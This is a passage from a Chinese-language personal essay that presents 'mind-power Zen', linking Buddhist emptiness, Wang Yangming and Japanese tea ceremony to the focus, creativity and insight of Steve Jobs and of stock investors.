心力禅见地</h2><p>以上阐述了我对心力之愿力、专注力、创新力和洞察力的理解，并以乔布斯和稻盛和夫的事业作为最主要的案例加以说明，我之所以对这两位的人生这么感兴趣，是因为他们都是著名的禅宗教徒，同时一生成就惊人。他们从禅悟到了什么，空性的智慧是如何指导他们的人生的，有不少研究的文章，我个人则尝试从“心力”这个角度进行探讨，不能说乔布斯从禅所悟得的东西就是文章里的见地，这只是我个人受乔布斯“心力扭曲力场”启发所作的一些研究。乔布斯每天忙着改变世界，他对禅的兴趣不在于理论总结，而是实修。另外我要指出，尽管乔布斯和稻盛和夫修行功夫已经很深了，但是他们并不是完人，都有很多的缺点，乔布斯缺点还众所周知的十分突出，我们没必要因为他们成就很高就神化他们。</p>\n<p>禅最核心的内容是智慧和慈悲（修行就是“悲智双运”），本文都涉及了，虽然主要阐述的是空性的智慧，慈悲当然也非常重要，只是不是这次我演讲的重点，也可以把本文看作是一个禅学的概论，这个概论以“心力”为主要见地统领全篇。我一个朋友看完提纲后和我说，既然缘起是乔布斯的心力，为什么不把它叫做“心力禅”呢？我想想也有道理，于是花了很长时间总结了它的几个重要见地，和大家分享一下。</p>\n<h3 id=\"一、指月之指\"><a href=\"#一、指月之指\" class=\"headerlink\" title=\"一、指月之指\"></a>一、指月之指</h3><p>一般人把佛法和佛教混为一谈，佛法就是佛陀证悟的真理，精髓是缘起性空，就像一颗晶莹璀璨的夜明珠，而佛教是宣扬佛法的宗教组织体系，为了吸引信徒，会在佛法这颗夜明珠外面包装一些仪式、迷信、神话等等，有些佛教团体本身有复杂的利益诉求，例如藏传佛教，它要建立一个政教合一的政体，为其合法性，它把一些统治信徒和有利施政的策略也包装在佛法外面，另外历史上佛法主要由出家人传承，他们也会把他们相对消极出世的价值观包装其外。其实为宣传佛法，外面加上适当包装有其必要性，但是我们一定要明白，我们最终想得到的不是精美的包装，而是真理本身，但是很遗憾很多信徒已经混淆了两者。佛教传承了两千多年后，其包裹在佛法外面的包装已经臃肿不堪，甚至光陆怪离，不得不指出其中夹杂了太多的糟粕，某些教派的某些教义不但不能导人智慧，而是导人愚痴。现在很多人对佛法的印象是封建迷信、消极避世，其实他们接触的往往是宣传佛法的佛教组织，直接感知的只是佛法外面的那几层包装，对佛法的精髓——空性的智慧知之甚少。</p>\n<p>今天我尝试直接移开这几层包装，让大家一睹这颗夜明珠的绝世风华。大家看到了么？我想可能是看到了一些亮光，但是仍然朦朦胧胧，为什么呢？世人之无明，有如尘垢，厚厚地粘在这颗夜明珠上，让它黯然失色。六祖说的明心见性，就是指要把粘在这颗夜明珠上的尘垢去掉，去掉的尘垢越多，那么夜明珠透出来的光线就越明亮，光线增亮的过程，就是我们对空性的领悟提升的过程。</p>\n<p>在研究乔布斯的这段时间，我意识到，随着我们对空性的领悟越来越深入，我们的心力也会越来越强，相对于空性太抽象，不易把握确认，心力人人皆可感应，我举几个寻常例子：有人以前工作老是走神，总是不停地刷朋友圈，但现在可以很长一段时间不看手机而专心工作了，说明他的专注力提升了；有室内设计师进行装修设计时，翻来覆去就是那几个idea，最近一段时间感觉有如神助，设计灵感源源不断，说明他的创新力提升了；有证券分析师研究某个行业，一开始感觉千头万绪，抓不住重点，现在开始明白这个行业最重要的护城河是什么，说明他的洞察力有所提升;有朋友原来只想安安稳稳打份工，最近在思考创业，打算给这个世界make some  different ，说明他的愿力在提升，等等,一个人内心变得越来越有力量的时候，整个人的精神面貌、气质都会发生变化，不仅你自己，你身边的人包括亲属朋友同事都能感知。乔布斯的心力太强大了，他的员工朋友还有全世界的果粉都能强烈地感受得到。</p>\n<p>做投资我比较喜欢买创始人还在直接管理的公司，公司其实是无中生有的，是创始人凭他强大的心力心生万法创造出来的，如果他不管理了，后任者可以继承公司的管理制度，但是要继承他的心力，其实非常困难。去公司调研，我特别重视和创始人的交流，和创始人谈一谈他的价值观和未来愿景，感受他的愿力和专注力，了解公司新产品的规划，感受他的创新力，请教一下行业的问题，感受一下他的洞察力，此外还要和他的各个层级的员工谈一谈，感受下创始人的心力是否强大到强烈地影响他们的价值观和生活方式，公司创始人只有心力超级强大，他才可能很好地“心生万法”，把企业经营得特别好。</p>\n<p>一个公司HR所制定的人力资源标准，一般包括学历、经验、技能、积极性、执行力等，但这些只是表象，如果从一个员工的愿力、专注力、创新力和洞察力这四个指标加以衡量和考察，我认为才切中人的素质的本质。一个好的公司，应该制定系统性的方案通过各种形式如企业愿景讨论、专注力培训、行业创新案例分享、杰出员工经验交流等全面提升员工的这四种心力，这才是提升人力资源素质最核心的东西，每个卓越的公司其实都是一个能够强烈地系统性地提升全体员工心力的道场。</p>\n<p>禅非常强调“明心见性”，“见性”就是证悟空性，“明心”简单说来就是了解我们的心，心如此抽象和莫测，如何“明心”呢？我认为，通过细细体察我们心力的变化，从而深刻感受它无常无我的本性，就是在“明心”。心力确实是可以被感知的，佛法中的空性常会被比喻为天上的明月，那么心力，就是指向这轮明月的一根手指。</p>\n<h3 id=\"二、佛法在世间\"><a href=\"#二、佛法在世间\" class=\"headerlink\" title=\"二、佛法在世间\"></a>二、佛法在世间</h3><p>佛法无处不在，或者说所在皆是，它是无善无恶的，也无所谓出世入世，但世人一直为这件事纠缠不清。实际上，出家人（和尚和尼姑）只是人的一种身份（在中国信仰佛法的人很多，但出家人比例极低），作家是一种身份，寿司师傅是一种身份，舞蹈演员、投资者、企业家等等都是一种身份，佛法普度众生，每一种身份的人都能从中汲取智慧，获得美满人生。</p>\n<p>有很多对佛法的误解，例如人生是不真实的，只是一种虚构；追求世俗意义的成功包括金钱地位就是“执著”，就是没有“出离心”，是烦恼的根源；只有远离世间修行，才能获得解脱，在世间工作中修行是不究竟的，只要用空性的智慧观照，这些看法都是不正确的。佛法有八万四千法门，适合不同根性、不同境况的世人，有些法门只适合出家的僧侣或者立志以出世方式修行的人，同时还有很多法门比较适合入世修行的普通人，这些法门与出世的法门有很大的区别，遗憾的是有些人误以为只有出世的法门才能修行，才能证悟，从而走了很多弯路。</p>\n<p>我自己学禅多年，除非旅游基本不去寺庙，也不认识什么高僧大德，也不吃斋念佛，也不放生做法事，因为这些都是出家人的生活方式，和我们普通人截然不同。普通人有各种各样的身份，正如六祖说的那样，他们要在世间努力修行，工作是他们最好的修行道场，他们要勇于在他们的工作中证悟空性，同时,和出家人一样，他们同样可以“行菩萨道”，造福社会，只是方式和出家人不一样。今天，禅在世界范围内日渐流行，各种文化背景的人都可以修行禅的明心见性，甚至出现了供基督徒修行的基督禅，禅其实是超越宗教的。（我在附录的《轮回真的存在吗？》一文有更深入的分析。）</p>\n<p>传统佛法一般认为是通过坐禅，六祖的禅超越了这个见地，他提倡通过世间修行，但具体方法是什么？传统经书很少涉及，我提出了在实践中证悟空性的三种方法，第一种是传统的方法，第二第三种方法与我们创新力和洞察力的提升紧密相关，证悟空性不再虚无缥缈，而是与实践相结合。</p>\n<p>以前我看过不少开悟的故事，基本都是一些出家人，有些夜睹启明星升起而明心见性，有些在溪水边看到倒影而大彻大悟，未来我希望可以看到这样的故事，一名设计师几天几夜不眠不休寻求创意，在灵感迸发的那一刻领悟“无所住而生其心”而大彻大悟，或者一名基金经理在研究科技的进步与护城河变迁的关系中，一刹那间明白“常与无常不二”而证悟空性。</p>\n<p>由于从事证券投资的缘故，我常想还有比股市更好的修炼心性、证悟空性的道场吗？股市动荡不安、暴涨暴跌乃为常态，涨跌最能牵动人的七情六欲;股市是最具创新精神的地方，常有上市公司开创全新的商业模式，市场本身又常会推出各种新的交易工具例如期指期权CDS等等，这些创新的东西往往蕴藏着巨大的全新的投资机会;股市又是最好的洞察人性的地方，贪婪和恐惧阶段性集中暴发。在股市这样一个充满变数也充满着无限可能的地方修行以证悟空性，远比一个不问世事的人在深山老庙里静坐修行要复杂得多，但是我想也有效得多。</p>\n<p>我特别想指出的是，在世间修行以证悟空性，不是一个类似终点冲刺式的结果，而是一个螺旋阶梯式的、永无止境的、自我突破的过程。每跃上一个新的螺旋阶梯，我们对空性的理解就会发生一个重大的以至质的突破。每一个螺旋阶梯，我觉得可以分为两个阶段，第一阶段是放弃顽固的“自我”，也就是要放弃之前个人的种种偏执和成见，回到初学者的状态，以虚怀若谷的态度接受各种方法，这时候我们的心就拥有了无穷无尽的可能性，李小龙在所著的《生活的艺术家》对此有非常精彩的论述：</p>\n<blockquote>\n<p>“你所掌握的知识和技巧应该被遗忘掉，这样一来，你就可以漂流在虚空的世界里，无拘无束，安逸无虑。学习很重要，但不要成为其奴隶。”</p>\n<p>“让所有的训练随风而去，让心无知无觉地工作，让‘自我’消失到无人知晓的地方，只有这样，截拳道才能达到尽善尽美的程度。”</p>\n</blockquote>\n<p>这个过程也被道家称为“忘我”或者“无心”。</p>\n<p>第二阶段是重建强大的“自我”，他需要在无穷无尽的可能性中“无所住而生其心”，深入思考事物的各种因缘并进行大量尝试，然后勇敢地提出新的“自我”的见解并接受实践的检验，这是一个痛苦的风险巨大的过程。这个过程完成后，“自我”涅槃重生，更加广博和更加强大。</p>\n<p>这两个过程可以归结为“先破后立，再破再立。”我之前总结的证悟空性的三种方式，都要经历这样的过程，都是对人的心力的重大考验。打个比方，每一个人的“自我”相当于一个小瓶子，瓶子的容量是有限的，总会装满的，第一个阶段相当于把这个小瓶子打破，愿意主动打破这个旧瓶子需要巨大的勇气;第二个阶段相当于重新生成一个更大的新瓶子，能否成功生成这个新瓶子需要很大的智慧。这两个阶段循环往复，瓶子空间越来越大的过程，就是我们对空性证悟越来越深刻的过程，我们内心的力量也会不断增强。</p>\n<p>我看过一些佛教书籍包括一些所谓大师的著作所传导的修行方法，他们很强调第一阶段，即“放弃自我”的阶段，但并不认为需要第二阶段，他们认为通过冥想打坐等方式放弃“自我”成见后，真相就会以一种神秘的不可思议的方式浮现出来，而且这种真相是不带有任何个人“自我”色彩的，是事情的全部真实，我的一些朋友深信不疑，非常勤奋地练习了，但是遗憾的是，练习之后，我并没发现他们对事物有了新的更为深入的认识，或者说更有智慧，他们停留在第一阶段不思进取却认为自己境界高远，就像攀爬一座100级的旋转楼梯，他们才上了一两级就以为自己已经身处巅峰，他们之所以会这么想，我认为是长时间禅修后生理或者心理上的一种错觉，但他们却把这种错觉当成了一种修行的成就，这样的一种理论是不完整的和有偏差的，而且很容易误导他人陷入消极、迷惘和虚无的境地。深刻理解证悟空性的这两个阶段，会让我们少走不少弯路。</p>\n<p>知与行的关系也与心力相关。很多东方哲学家如朱熹、陆九渊、王阳明都有论述两者的关系，朱陆认为先知而后行，而王阳明认为是知行合一，我个人认为知与行是先后的两个过程，而知行合一是目标，知行合一说来容易，但实施起来非常困难，为什么呢？我觉得主要原因是心力不足，有很多种情况，例如一些人确实打算这么做，但是意志不够坚强，碰到一点困难就打退堂鼓，那是愿力不足;一些人决心是足够了，但工作中很容易受到各种干扰，难以专注，一些关键节点总是很难突破，进展就会很慢甚至停滞不前，这是专注力不足;一些人非常努力，但是谨慎有余、创意不足，缺乏新意的产品在竞争中就很容易失败，这是创新力不足;还有一些人对工作的研究深度不足，不能洞察本质掌握规律，即使再努力也难以成功，这是洞察力不足，因此我认为，愿力、专注力、创新力、洞察力任何一方面有大的缺陷，都可能导致心力不够强大，从而难以知行合一，要做到知行合一，需要强大的心力。</p>\n<h3 id=\"三、心与世界的关系\"><a href=\"#三、心与世界的关系\" class=\"headerlink\" title=\"三、心与世界的关系\"></a>三、心与世界的关系</h3><p>六祖所创立的禅高度强调心的作用，心与世界是一种什么样的关系，这个问题类似哲学的认识论，它探讨的是人在认识这个世界、探索这个世界的规律以及改造这个世界的过程中，心是如何起作用的。结合心力这个概念，我系统地谈谈我的看法。</p>\n<h4 id=\"1-心生万法\"><a href=\"#1-心生万法\" class=\"headerlink\" title=\"1. 心生万法\"></a>1. 心生万法</h4><p>“心生万法”是佛法的重要见地，可以说是佛法认识论的基础，但这个见地由于太抽象很容易被人误解。我们不妨先来参一参心学宗师王阳明这则著名的“岩中花树”的故事。</p>\n<p>王阳明和一位朋友来南镇旅游，他的朋友指着岩石中的一棵花树问他：“你说过‘天下无心外之物’，但这棵花树在深山中自开自落，和我的心有什么关系呢？”王阳明说：“你没看这棵花的时候，‘此花与汝心同归于寂’；你来看这棵花的时候，‘此花颜色一时明白起来’，便知道这棵花不在你的心外。”</p>\n<p>我从禅的角度来谈谈我的理解，通过所见我的心可以感知这朵花（感知这朵花还有很多种别的方式，例如耳朵听到别人提过它，鼻子闻到了它的香味等），此花因此就颜色明艳地长在了我的心里（“此花颜色一时明白起来”）;如果我未能感知这朵花，这朵花再美丽，我的心里也没有它（“此花与汝心同归于寂”）；想象一下在亚马逊丛林里，一朵美丽的野花在静静地盛放，从来没人见过它，它没能长在任何人的心里，那么这朵野花是真的存在吗？这朵花当然是真实存在的；人类诞生不过几万年历史，在这以前，无数花开了又谢，谢了又开，它的真实存在当然更是和人没有任何关系，这个案例说明客观世界是不依赖我们心的感知而存在的。</p>\n<p>王阳明说的“天下无心外之物”，并不是说离开了心，物就无法存在，或者说天地间从来就有一个神秘莫测、不可言说的主体，勉强起了一个名字叫做“心”，它创造了这个世界，而是说每个人都有他自己的世界（天下），这个世界是由他的心的感知而形成的，每个人的世界有大有小，我们之所以要“读万卷书行万里路”，就是为了通过读书行路增长心的感知，从而扩大我们的世界，这是“心生万法”的第一重内涵。</p>\n<p>再看另一则著名的公案：</p>\n<p>两和尚看到风吹幡动，一个说是风动，一个说是幡动，六祖说“非风动，非幡动，仁者心动。”</p>\n<p>​这个公案不是说心有某种神秘的力量能让风动或者幡动，而是说，当我说风动或幡动的时候，是由于我的心通过近距离看见感知到了，也就是心动了，我的世界里因此风飞幡动，如果我的心没有感知到，例如看不到它，也就是心没动，风再动，幡再动，我的世界里还是风幡全无。</p>\n<p>有一个很贴切的比喻，我们可以把心想象成一台相机的镜头，只有这个镜头“看到”了并咔嚓一下，眼前的物体才能记录下来并存放在相机的一片储存卡里，储存卡里存放的所有照片相当于一个人所感知的世界。</p>\n<p>让我们继续更深入地思考，上文说了客观世界是不依赖我们的感知而存在的，此刻，让我们看一眼这个客观世界，比如你朝热闹的大街看一眼，你所看到的真的是完全“客观”的吗？人第一反应都会说，那当然啦，怎么会有疑问呢，但实际并非如此。比如我吧，我看到了一名丰满的美女回眸一笑，而一名宠物控小女生，注意到了一只可爱的泰迪狗在行人道上欢蹦乱跳，而一名山寨手机厂商，一看到有人掏手机出来就两眼放光，根本没注意到一名绝色美女正和他擦肩而过，几个人同时看了一眼同样的大街，但是看到的是完全不同的东西。这个例子说明，你对什么动心，或者说你的专注力放在什么地方，你就看到什么东西，也就是说，你看到的所谓的“客观世界”，你以为非常客观，其实只是你内心由专注而产生的一个主观投射，这是“心生万法”的第二重内涵。</p>\n<p>回到心动风动这个公案，六祖之所以心动了，不仅由于他能够看到这面旗子，而且由于他正在专心地看，而不是被天空中的一只飞鸟所吸引而对这面旗子视而不见。看一眼电脑屏幕腾讯的价格走势图，不同的人其实看到了不同的腾讯，有些人看到了腾讯的基本面，他会认真分析腾讯的护城河、赢利能力、增长潜力等，这个人是一名价值投资者；有些人看到了腾讯股价和相关的衍生品价格之间的联动性，他正在努力思考套利的策略，这个人是一名量化交易员；还有人看到了腾讯买卖盘上下十个交易价格的跳动，他一心寻思如何设计一个程式利用其中极微小的差价高速交易以谋利，这个人是一名高频交易商，等等。你内心专注什么你眼睛就看到什么，每一个人看到的腾讯都是对的，只要用心把相关研究做到极致，每一种不同的投资理念都能赚大钱。</p>\n<p>还是以相机的镜头作比喻，内心专注于一件事情，相当于把镜头的光圈调到很大，用这个大光圈来拍照，只有焦点处的物体是清晰的，旁边的都是模糊的，这样一幅焦点清晰、周围模糊的照片，就是你所看到的客观世界。</p>\n<p>一般传统书籍，对于心生万法的讨论就到此为止了，但是我们还可以进一步深入，你我的心都对一件事情保持专注，例如一朵美丽的花，你所看到的花就和我看到的花就一样吗？当然不是，你越专注，或者说专注力越强，那么你看到的世界就越细致越清晰，就像用相机拍花，越专注相当于镜头光圈越大，用越大的光圈拍同一朵花，焦点中的花在照片中就显得越突出，而且，为了更好地研究或者说洞察这朵花的奥秘，你还可以把普通的镜头换成微距镜头，距离非常近去拍摄这朵花，那么这朵花非常微小的细节你都能看得清清楚楚，而且更进一步，你还可以把镜头换成显微镜，那么这朵花的肉眼都看不到的细胞壁你都了如指掌了，这是一般人根本无法想象的境界。把镜头从普通镜头换成微距镜头到显微镜头的过程，可以理解为心的洞察力显著提升的过程，也就是说不同的人看同样的客观世界，由于专注力和洞察力的差异，心对这个世界的认识就很不一样，主要体现在深度上，这是“心生万法”的第三重内涵。</p>\n<p>不知道大家是否意识到，“心生万法”的第二和第三重内涵，所传导的对这个世界的认知方法和传统的认知方法其实是非常不同的，例如，我们在工作争论的时候常会说：“你没有客观认识这个问题”，言下之意是你是主观认识这个问题，而我是客观的。实际上，这个世界确实是不依赖我们的心而存在的，因此我们说它是客观的，确实有客观世界这回事。但是，每个人看到这个客观世界后在心里所形成的画面，其实只不过是我们的心的主观投射，也就是我们的主观认识，或者也可以说是内心所生起的一种幻象，哪有什么客观可言。</p>\n<p>这让我想日本著名的电影《罗生门》，一个武士在丛林中被杀，五个证人分别讲述了五个非常不一样的现场目击故事，每个人都极力撇清自己的责任，都归咎于他人，也就是说他们所描述的故事其实都是他们内心主观加工过的图象，而且他们每个人看起来都坚信不疑，谁真谁假？这个故事有非常深刻的内涵，历史的真相是什么？其实也没人可以说得清楚，每一个阐述的人都认为自己所了解的才是唯一的真相，其实这种真相也不过是每个人内心的幻相，都有非常主观的目的，一般都是对自己比较有利，我们经常看到对同一段历史，不同的统治者给人们灌输的解读截然不同，原因就在于此。</p>\n<p>这会带来一个严肃的理论问题，既然我们每个人对这个世界的解读都是非常主观的，那么我们又如何能够比较准确（注意：我这里用得是准确，而不是客观）地认识这个客观世界呢？我自己也思考了很久，我会引入辩证法的一些观点，例如主观地动态衡量问题的主要矛盾和次要矛盾力量的消长以进行判断并以实践结果作为检验，这个问题很重要但并不是今天讨论的重点，希望以后有机会再和大家一起分享对这些问题的思考。</p>\n<p>用这种认识方法思考投资也很有意思，自从巴菲特价值投资大行其道，就有教条主义者认为一个公司的价值应该可以通过某一个客观的公允的估值公式计算出来，然后价格围绕价值波动，这种观点其实并没有真正理解巴菲特。实际上，无论多少完美的估值公式，那些估值参数都可以被人为地主观调整而让看似严肃的估值成了任人打扮的小姑娘，这样的估值哪有什么客观可言。我们看到的在显示屏上不停跳动的股票价格其实只是一个幻象，不过这个幻象是无数市场参与者无数颗心相互碰撞形成阶段性共识后所衍生的，这个幻象的形成包含了一系列非常脆弱的假设，包括基本面的、宏观面的等等，这些假设随时都可能发生改变，从而又不断生成新的幻象，这也是一种“缘起性空”。</p>\n<p>巴菲特是真正的智者，他说众人恐惧我贪婪，众人贪婪我恐惧，他早就洞察众人情绪的波动会引发股价的重大波动，或者说股价波动乃众生心动。我们研究投资到底是在研究什么？其实本质上我们研究的只是心的一种幻象，如梦幻泡影，如露亦如电，虽然我们非常努力地从中寻找规律，但这种规律和相对稳定的物理规律、化学规律不同，作为一种解释幻象的规律，亦如梦幻泡影，需要经常根据投资环境的变化作出大大小小的调整。投资赚钱不易，越理解缘起性空、心生万法，就越能理解投资的本质。</p>\n<p>以上三点认识仍然不是我们认识的终点，这三点是探讨我们的心与已经存在的客观世界是如何互相联系互相影响的，我们的心的能力远不止于此，它还能通过分析生起事物的诸多因缘的变化，用它的创新力去构造全新的因缘从而创造出新的事物，从而更深刻地改造这个世界，这是“心生万法”的第四重内涵。iPod、iPad、iPhone就是乔布斯“心生万法”的产品。在很多别的宗教如基督教里，人心是非常卑微的，它的任务只是顺从上帝的安排，而在六祖的禅里，心被提升到了极高的地位，没有什么是不可能的，只要因缘俱足，我们的心就可以创造一切，从这个角度看，它就是它自己的主人，它自己就是这个世界的“上帝”。我从来没有看过任何其他的哲学或者宗教，赋予人心如此高的地位。</p>\n<p>以上探讨的是“心生万法”的四重内涵，这四重内涵都和心力直接相关。总结一下，每个人所认识的世界源于他的心的感知，我们所看到的所谓客观世界其实并不客观，只是我们内心由于专注而产生的一种主观投射，心的专注力与洞察力的差异，决定了我们认识世界深度的不同，心的创新力可以创造新的事物，从而改变这个世界，从更高维度看，心即世界，世界即心，心与世界是不二的。通过对“心生万法”这四重内涵的分析，我们可以认识到我们的心可以是何等的强大。</p>\n<h4 id=\"2-道由心创\"><a href=\"#2-道由心创\" class=\"headerlink\" title=\"2. 道由心创\"></a>2. 道由心创</h4><p>《洞察力》一章提到，日本人用心把禅注入工作中，化腐朽为神奇，把简单的工作提升到高妙的道的境界，本节探讨一下这种“道”究竟是一种什么东西，实际上，这种道的形成正是“心生万法”的重大成果。</p>\n<p>“道”其实是道家的专门术语，道家认为，宇宙中存在着一种高深莫测的永恒的类似规律或者本质的东西，不知其名，勉强称之为“道”，道无处不在但没人知道它是如何形成的，从这个意义看，我们世人只是“道”的旁观者，只能仰慕，但我们可以通过修炼用心感悟它，后来禅也借用了道家“道”这一术语，但两者的区别还是很大的，禅的体系里并没有这样一种先天就存在的、恒定的不变的东西，所有的东西都是由一些因缘（条件）构成的，而且不断变化，有生起、发展和最终消亡的过程，禅的“道”，可以理解成通过研究这些因缘之后，总结的阶段性的一些规律。为以示区分，我自己把禅的“道”称为“禅道”。在中国历史上，禅学和道学不断融合，你中有我，我中有你，但是我认为，把它们适当区分加以分析还是很有必要的。</p>\n<p>先介绍一下茶道，日本的茶道很能体现“禅道”的精神，宋朝著名禅师圆悟克勤说过“禅茶一味”，揭示了品茶就是悟禅，但可惜的是自宋之后，中国的茶道就走向没落，时至今日，与禅的关系已经不大，现在中式品茶的典型代表是潮州的功夫茶，茶客最关心的是茶的品质，好不好喝，所谓一些规矩主要是指冲泡的一些流程，当然也有一些茶客会在茶香缭绕中追求更高的精神境界。而在日本，茶道的发展已经超越了品茶本身而成了一种心灵修炼，茶道的形式非常繁杂，我尝试精要地阐述一下其精华。</p>\n<p>日本茶道从客人怀着恭敬的心情踏进茶室所在庭院就已经开始，日式庭院的设计非常讲究，一草一叶都经过看似漫不经心的精心修剪，客人沿石径来到一个小水槽边稍作清洗，以示荡涤污垢，洁净身心，一进茶室，会看到茶室里布置有代表茶道大师个人品味的字画，还有一处由大师精心准备的插花，因时而异，暗香浮动，等客人全部入席后，室内再无任何声响，除了铁壳煮水的沸腾声，由于铁壳壶底铁片经过特殊处理，因此水沸之际会响出特别的声音，如风吹竹林，又如惊涛拍岸，令人心旷神怡，之后是茶道大师为客人点茶，宾客致谢并传杯共饮，其庄严的程度，不亚于牧师主持一场小型的宗教仪式。主持茶道的大师已经不是一名简单的工作人员，他其实是一名哲学大师兼导演，在他的刻意引导下，宾客非常用心地合作，共同完成了一项即兴的隆重的行为艺术，一起追求一种超越现实、超越物质的类似“禅的开悟”的非凡境界。</p>\n<p>有人问日本茶道的始祖珠光大师：“茶事是什么？”珠光回答：“茶非游非艺，实乃一味清静、法喜禅悦的境地。”日本茶道的集大成者千利休更把茶道归结为“和敬清寂”四个字，每个字都蕴含了千利休对美、对人生的深刻的领悟。日本茶道发展成了一种关注内心、追求开悟的极致体验，这种体验，不是自然而然的，而是心的极度精心的创作，而在其发源地中国，茶道其实并没有发展到这样一种境界。</p>\n<p>日本其他“工作之道”同样令人印象深刻，日本的花道、剑道等在全世界范围内被推广，哪怕是小野二郎传承的小小的寿司制作之道也深受世人推崇。禅认为禅无处不在，哪怕最不起眼最卑微的东西都完整地蕴含佛性，都蕴藏着全宇宙的全部秘密，这就是所谓的“一花一世界，一叶一菩提”，因此各个领域的匠人都对自己的工作，哪怕看起来非常平凡，都觉得非常神圣和充满敬畏，数十年如一日精益求精。受禅的影响，匠人们非常重视心的修炼，相信只要持续地非常用心地钻研，就能发现规律持续创新，不断提升工作的境界。茶道、花道、剑道等等这些工作之道，并不是一种先天就存在、永恒不变、神圣不可侵犯的东西，而是他们自己用心亲自创造出来的，是将心注入的结果，追求极致，就是精进修行，越极致，越精进。</p>\n<p>心与“工作之道”的这种关系与道家的观点非常不一样，心不再是“工作之道”被动的旁观者，而是直接的主动的创造者！这一点其实意义非常重大。我的一个爱茶成痴的朋友说，日本的茶道非常繁琐，非常不适合中国人，中国茶道应该不会比日本茶道境界低，应该会有非常深刻的内涵，只是他还没有悟出来，我说，对呀，中国茶道当然可以有更高的境界，只是实际上，茶不过是一种植物的叶子，经人工处理后尝起来有些特别的味道，仅此而已，这个世界上根本没有中国茶道这种东西，也没什么好悟的，你要将心注入，把最深刻的哲学内涵——可能是庄子的，也可能是六祖的，也可能是王阳明的，甚至是完全自创的——注入这杯茶中，这就是你的茶道，未来如果被大家接受了流行开来，可能就成了博大精深的中国茶道，一如千利休茶道成了日本茶道，我的朋友听了，恍然大悟。</p>\n<p>以上介绍，其实只是想启发大家，在禅的世界里，心是道的主动的创造者，只要我们用心钻研，将心注入，我们也可以自创其道。这个“道”推而广之遍及各种领域，不仅包括日常生活领域的茶道花道，也包括工作领域的投资之道、设计之道，还包括更高深的精神领域中的哲学宗教等等。以投资领域为例，巴菲特创造了所谓“价值投资之道”，简单说来就是在有安全边际的前提下买入那些有很深的护城河的公司并长期持有，索罗斯创造了所谓的“宏观对冲之道”，简单说来就是研究宏观数据变化与金融产品走势的相关性并以对冲的方式顺势而为，两种投资之道都非常成功，另外还有对冲基金专攻量化交易、高频交易等，也有不少取得长期非凡回报的，足以证明证券市场可以容纳无穷多的差异极大的投资之道，即使是巴菲特所创造的投资之道，也不是神圣到不可以改变，会有人考虑加入期权操作等方式谋求新的突破。</p>\n<p>“道”是由老子提出来的，从禅的角度看来，也不是什么先天就存在的亘古不变的真理，这只不过是老子自己通过观察思考所创造的一种理论，准确来说只是老子之道，他的一些见地也并不是必然正确并放之四海而皆准的，例如他极度重视柔弱，认为柔弱胜刚强等，有很多别的国家或者个人在做重大决策的时俱，所选择的策略并不符合老子的这种见地但也持续取得了巨大的成功，例如美国，老子对柔弱有特别的偏爱，这一点对中国人影响极深，甚至影响了民族的血性，汉族男子相对缺乏阳刚之气以此关系不小，当汉民族遇到那些以勇猛剽悍著称的“野蛮民族”如当年的蒙古族、满族时，数量、甚至财力虽占很大优势，居然会溃不成军、一败涂地以至灭国，难道不应该对老子之道的弊端认真反思吗？</p>\n<p>在辩证法看来，示强还是示弱，要看双方力量的对比及消长情况而定，该柔弱时就柔弱，该强硬时就强硬，才是更好的应对之策，我们要打破对老子所创造的这种道的迷信。不仅老子之道，孔子之道、阳明之道、耶稣之道，甚至佛陀之道，等等，也都是这些宗教或哲学大师们精进思考所总结的“禅道”中的一种，智慧非凡，但都不是什么天启的真理，都需要接受实践的检验。</p>\n<p>佛陀自证悟后持续说法四十九年，但是他在《金刚经》里却宣称，如果有人说我有所说法，那就是在诽谤我！这指控太严重了，佛陀这么说是要破除一切相，我们不要迷信任何人，包括他自己。对各种贤圣的理论，我们都不必盲从，而是要以汲取精华、去其糟粕的态度来学习，甚至还可以与时俱进推动这些理论的进化以指导最新的实践。</p>\n<p>最后我们来思考一下人生之道，人生之道通俗来说就是人生的意义是什么，其实人的一生也是一些因缘的和合，并没有什么特定的意义，人生的意义在于我们用心赋予它什么意义，人的一生可以积极进取，勇创巅峰，也可以悲观消极，无所作为，谁决定这一切？是你的心！你的心是你的人生意义的总设计师，不要再困惑于“我的人生意义到底是什么，我要找到它”，而是思考“我到底要把什么意义注入到我的人生”，思考方式稍作转变，海阔天空，世界豁然开朗。</p>\n<p>有人会问，心与世界的关系，与我们中学就学习的精神与物质的关系是一回事吗？其实并不是一回事，这个世界的现象可以分为精神现象与物质现象。物质现象如山河草木是如何形成的，佛陀只告诉你是由一些条件和合而形成的，至于是什么条件要由大家研究，精神现象如意志、情绪是如何形成的，也是由一些条件和合而成的，至于是什么条件也要由大家研究，也就是说在佛法的体系里，物质或者精神都不是最基本的，都是由因缘（条件）和合而成的，而且，随着这些和合条件的变化，两者都在持续变化之中，都有生起、发展和消亡的过程。</p>\n<p>合成两者的各种因缘有很多交集，也有更多的不同之处，非常复杂，两者的关系恐怕不是简单的谁生起谁或者谁决定谁的关系，很多哲学或者宗教最关心的问题之一是“到底是精神决定物质还是物质决定精神”，以禅的视角看，这个问题并非最究竟的终极问题，而且折射出一种冲突的二元论的思考方式，禅最关心的是心与整个世界（包括精神和物质）的关系，而且从最高维度看，它们是和谐不二的，或者说是一元的。我们要认识这个世界，其本质就是研究生起精神和物质现象的各种因缘（条件）的种种变化，我们的心天生就是从事这项研究工作的，能力强大到不可思议。传统上，如果认为物质决定精神，我们称之为唯物论，如果认为精神决定物质，我们称之为唯心论，从这个意义看，禅既非唯物论，亦非唯心论。</p>\n<p>行文至此，分享了许多我所领悟的关于“心”的见地，是时候总结一下心是什么，这是一个非常抽象的概念，王阳明总结得简单明了：</p>\n<blockquote>\n<p>“目虽视而所以视者，心也；耳虽听而所以听者，心也；口与四肢虽言动而所以言动者，心也”。</p>\n</blockquote>\n<p>更系统一点说，我们能听、能说、能闻、能感觉、能思考、能表达感情，为什么我们可以做到这些？原因是我们有心，换句话说，让我们能听、能说、能闻、能感觉、能思考、能表达感情的隐藏在背后的那个东西，就是我们的心。</p>\n<p>对心的这种认识，其实还很初级，六祖开悟时说心之自性：“本自清静，本不生灭，本自具足，本无动摇，能生万法。”其中最重要的就是“能生万法”，以我的理解，心的自性就是空性本身。从更高的角度看，心就是那个能感知世间因缘、能生起万法的那个东西。如果觉得很难理解，其实也不用管它，我们的“心”在哪里，我们是如何“用心”的，只要闭上眼睛想一想，凭直觉，就能知道。</p>\n<h4 id=\"4-自由境界\"><a href=\"#4-自由境界\" class=\"headerlink\" title=\"4. 自由境界\"></a>4. 